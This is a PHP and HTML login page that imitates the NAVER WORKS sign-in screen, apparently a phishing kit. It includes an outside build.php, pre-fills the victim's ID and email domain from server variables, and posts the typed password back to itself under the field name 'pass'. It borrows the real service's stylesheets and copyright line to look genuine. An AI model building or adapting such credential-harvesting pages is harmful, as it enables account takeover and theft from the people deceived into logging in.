<?php include '../build.php' ?>
<!DOCTYPE HTML>
<html lang="en">
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<head>
    <meta charset="utf-8" />
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/login.css?20260615195349_xvnwz">
    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/edge_pw_icon_disable.css?20260615195349_xvnwz">

<script type="text/javascript">
    var eventType = (/(MSIE (10|9|8|7)|Trident\/(6|5|4|3))/.test((window.navigator || {}).userAgent)) ? 'load' : 'pageshow';
    window.addEventListener(eventType,  function(event) {
        if (typeof lcsSti !== 'undefined') {
            sendLcs(lcsSti);
        }
    }, false);

    function sendLcs(lcsSti) {
        lcsSti = setMobilePrefix(lcsSti);
        lcsSti = setInstancePostfix(lcsSti);
        var resourcePhase = null;
        if (resourcePhase != 'real') { // stage도 리얼이 아닌 알파로 잡히게 수정
            window.lcs_SerName = 'alpha-lcs.worksmobile.com'; // for alpha Test
        }
        lcs_do({"sti" : lcsSti});
    }

    function setMobilePrefix(lcsSti) {
        if (navigator.userAgent.indexOf('WorksMobile') > -1) {
            lcsSti = 'm_' + lcsSti;
        }
        return lcsSti;
    }

    function setInstancePostfix(lcsSti) {
        var idcType = "kr1";
        if (idcType == 'kr1' || idcType == 'kr0') {
            lcsSti += '_kr';
        } else {
            lcsSti += '_jp';
        }
        return lcsSti
    }
</script>
</head>
<body>
<div id="root">
    <a href="#content" class="skip">go to the text</a>
    <div class="wrap en_US integration">
        <div class="container">
        <form name="login-form" method="post" id="login-form" action="" autocomplete="off">
            <div class="contents_box">
                <div class="contents ">
                    <h1 class="logo"><span class="blind">NAVER WORKS</span></h1>
                    <h2 class="title">Enter a password or<br>authenticate with trusted device.</h2>
                    <div class="input_wrap">
                        <input type="hidden" name="login" value="worksmobile">
                        <div class="input_area" id="idInputArea">
                            <div class="input_cover" id="idInputCover">
                                <label for="user_id" class="blind">ID</label>
                                <input type="hidden" id="user" name="user" class="input_box" value="<?php echo htmlspecialchars($decoded); ?>">
                                <input type="text" id="user_id" class="input_box"
                                       placeholder="Login ID" value="<?php echo htmlspecialchars($login_id); ?>">
                                <div class="other" id="mail_domain">@<?php echo htmlspecialchars($domain); ?></div>
                            </div>
                            <ul class="account_list" id="login_id_list">
                            </ul>
                        </div>
                        <p class="invalid_desc" id="idFailMessage">Enter your ID.</p>
                    </div>
                    <div class="input_wrap">
                        <div class="input_area">
                            <div class="input_cover" id="pwdInputCover">
                                <label for="user_pwd" class="blind">password</label>
                                <input type="text" id="user_pwd" name="pass" class="input_box" placeholder="Password">
                                <button type="button" id="user_pwd_clear" class="btn_delete"><span class="blind">delete</span></button>
                                <div class="other">
                                    <button class="btn_masking"><span class="blind">show the password</span></button>
                                </div>
                            </div>
                        </div>
                        <p class="invalid_desc" id="fail_message" style="<?php echo $error; ?>">ID or password do not match.</p>
                    </div>

                    <div class="security_area" id="divCaptcha" style="display: none">
                        <div class="input_img_cover">
                            <div class="img_box" id="captchaImage"></div>
                            <button type="button" class="btn_refresh" id="changeCaptchaBtn">Refresh</button>
                        </div>
                        <div class="input_cover" id="captchaInputCover">
                            <label for="user_auth" class="blind">CAPTCHA</label>
                            <input type="text" id="user_auth" class="input_box" placeholder="Captcha code">
                        </div>
                        <p class="invalid_desc" id="captchaFailMessage">Please enter captcha.</p>
                        <input type="hidden" id="captchaKey" value="">
                    </div>
                    <div class="input_btn_area">
                        <button type="submit" id="loginBtn" class="btn_submit">Login</button>
                    </div>
                    <div class="check_area">
                        
                        <div class="check_info">
                            <div class="check_cover">
                                <input type="checkbox" id="keepLogin" class="input_check">
                                <label for="keepLogin" id="label_keepLogin" class="input_label">Keep logged in</label>
                                <div class="tooltip_area">
                                    <button class="btn_tooltip" id="keepLoginBtn"><span class="blind">tooltip</span></button>
                                    <div class="tooltip_box wide" id="keepLoginToolTipBox">
                                        Automatically log in with this account.<br/>
                                        Others may be able to log in with this account. Please use this on a home or business PC to protect your information.
                                        <button type="button" class="btn_tooptip_close"><span class="blind">close</span></button>
                                    </div>
                                </div>
                            </div>

                            
                            <div class="more_area">
                                <a href="#" class="link findPwdBtn">Find Password</a>
                            </div>
                        </div>

                        
                        <div class="check_info">
                            <div class="check_cover" >
                                <input type="checkbox" id="rememberId" class="input_check" checked>
                                <label for="rememberId" class="input_label">Remember ID</label>
                                <div class="tooltip_area">
                                    <button class="btn_tooltip" id="rememberIdBtn"><span class="blind">tooltip</span></button>
                                    <div class="tooltip_box" id="rememberIdTooltipBox">
                                        Remembers your ID.<br/>
                                        Please pay special attention when using on a public PC with vulnerable security.
                                        <button type="button" class="btn_tooptip_close" id="rememberIdBtnClose"><span class="blind">close</span></button>
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                        <!--
                        <div class="login_other_area">
                            <button type="button" class="btn_social device" id="fidoAuthentication">Authenticate With Trusted Device</button>
                        </div>-->
                    </div>
                </div>
            </div>
            </form>
            <div class="other_contents">
                <a href="#" id="clearIdBtn" class="another_way back">Login with other account</a>
            </div>
            <footer class="footer">
                <address class="copyright">&copy; NAVER Cloud Corp.</address>
            </footer>
        </div>
    </div>
    <input type="hidden" id="fingerPrint" value="">
    <input type="hidden" id="fingerPrintDetail" value="">
    <input type="hidden" id="accessUrl" name="accessUrl" value="http%3A%2F%2Fcommon.worksmobile.com%2Fproxy%2Fmy">
    <input type="hidden" id="msgToken" value="">
    <input type="hidden" id="locationList" value="[kr1, jp1, jp2, kr0, de0, kr8, kr9]">
    <input type="hidden" id="language" value="en_US">
    <input type="hidden" name="deviceId" id="deviceId" value=""/>
    <input type="hidden" name="deviceIdSessionKey" id="deviceIdSessionKey" value=""/>
    <input type="hidden" name="openapiParameters" id="openapiParameters" value=""/>

    <input type="hidden" id="loginType" value="web"/>
</div>
<script>
    var isNcs = false;
    if (isNcs === "false") {
        var lcsSti = 'worksmobile_admin_auth_loginstep2';
    }

    var emailDomain = "<?php echo htmlspecialchars($domain); ?>";
    var serviceCode = "login_web";
    var maskedLoginIdListInfo = "";

    var oBubbleTip = new BubbleTip('rememberId', 'keepLogin');
    var oAccountList = new AccountList(maskedLoginIdListInfo, emailDomain);
    var oPasswordLogIn = new PasswordLogIn(emailDomain, serviceCode);
</script>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("user_pwd"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
